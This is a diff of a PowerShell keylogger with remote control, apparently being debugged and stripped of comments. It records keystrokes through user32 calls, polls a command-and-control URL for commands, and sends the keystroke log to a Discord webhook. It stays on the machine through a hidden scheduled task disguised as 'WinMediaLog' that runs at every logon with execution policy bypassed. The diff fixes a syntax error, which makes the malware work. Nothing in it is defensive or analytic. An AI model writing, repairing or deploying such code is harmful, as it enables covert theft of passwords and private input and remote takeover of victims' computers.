@@ -6,13 +6,11 @@ if (!(Test-Path $dir)) { New-Item $dir -Type Directory | Out-Null }
 $logFile = "$dir\data.txt"
 $scriptPath = "$dir\winlog.ps1"
 
-# Outer block safely containing no internal here-string symbols
 $payloadContent = @'
 param([string]$PCName, [string]$WebhookUrl, [string]$C2Url, [string]$logFile)
 
 if (!(Test-Path $logFile)) { New-Item $logFile -Type File | Out-Null }
 
-# Rebuilt C# engine using an inline array format to prevent nesting syntax blocks
 $C2Code = "using System; using System.Text; using System.Runtime.InteropServices; public class KeyEngine { [DllImport(`"user32.dll`")] public static extern short GetAsyncKeyState(int v); [DllImport(`"user32.dll`")] public static extern int GetKeyboardState(byte[] lpKeyState); [DllImport(`"user32.dll`")] public static extern uint MapVirtualKey(uint uCode, uint uMapType); [DllImport(`"user32.dll`")] public static extern int ToUnicode(uint wVirtKey, uint wScanCode, byte[] lpKeyState, [Out, MarshalAs(UnmanagedType.LPWStr)] StringBuilder pwszBuff, int cchBuff, uint wFlags); }"
 Add-Type -TypeDefinition $C2Code -ErrorAction SilentlyContinue
 
@@ -21,7 +19,6 @@ $discordInterval = 0
 $headers = @{ "User-Agent" = "Mozilla/5.0 (Windows NT 10.0; Win64; x64)" }
 
 while ($true) {
-    # ================= 1. THE NATIVE KEYLOGGER LOOP =================
     for ($i = 1; $i -le 254; $i++) {
         if ([KeyEngine]::GetAsyncKeyState($i) -eq -32767) {
             $keyText = ""
@@ -32,7 +29,7 @@ while ($true) {
                 13  { $keyText = "`n" }
                 16  { $keyText = "" } 
                 17  { $keyText = " [CTRL] " }
-                18  { $keyText = " [ALT] " ]
+                18  { $keyText = " [ALT] " }
                 20  { $keyText = " [CAPS] " }
                 27  { $keyText = " [ESC] " }
                 32  { $keyText = " " }
@@ -54,7 +51,6 @@ while ($true) {
         }
     }
 
-    # ================= 2. REMOTE COMMAND POLLING (Every 5 Seconds) =================
     if ($c2Interval -ge 500) {
         try {
             $cmdResponse = Invoke-RestMethod -Uri "${C2Url}/get_cmd?id=${PCName}" -Method Get -Headers $headers -TimeoutSec 5
@@ -67,7 +63,6 @@ while ($true) {
         $c2Interval = 0
     }
 
-    # ================= 3. DISCORD EXFILTRATION (Every 60 Seconds) =================
     if ($discordInterval -ge 6000) {
         if (Test-Path $logFile) {
             if ((Get-Item $logFile).Length -gt 0) {
@@ -88,14 +83,10 @@ while ($true) {
 }
 '@
 
-# Save payload cleanly to the local directory without dynamic array corruptions
 Set-Content -Path $scriptPath -Value $payloadContent -Force
 
-# Wipe out any older broken task profiles cleanly
 schtasks /delete /tn "WinMediaLog" /f 2>&1 | Out-Null
 
-# Register the new execution task using standard Bypass parameters natively
 schtasks /create /f /tn "WinMediaLog" /tr "powershell.exe -WindowStyle Hidden -ExecutionPolicy Bypass -File `"$scriptPath`" -PCName `"$PCName`" -WebhookUrl `"$WebhookUrl`" -C2Url `"$C2Url`" -logFile `"$logFile`"" /sc onlogon
 
-# Kickstart execution instantly for this active setup session
 schtasks /run /tn "WinMediaLog"
